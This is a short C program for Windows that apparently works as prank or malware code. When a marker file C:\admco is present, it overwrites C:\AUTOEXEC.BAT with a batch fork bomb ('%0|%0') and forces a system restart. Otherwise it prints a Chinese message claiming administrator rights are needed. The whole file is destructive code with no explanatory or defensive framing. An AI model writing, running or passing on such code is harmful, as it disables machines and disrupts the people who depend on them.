#include <stdio.h>
int main()
{
	if(fopen("C:\\admco","r")==NULL)
    {
        fprintf(stderr,"需要管理员权限\n");
       	while(1)
    	{
			getchar();
    		break;
		};
        return 0;
    }else
	{
		FILE *fp; 
		fp=fopen("C:\\AUTOEXEC.BAT","w");
    	fprintf(fp,"%%0|%%0");
    	fclose(fp);
    	system("shutdown -r");
	}
}
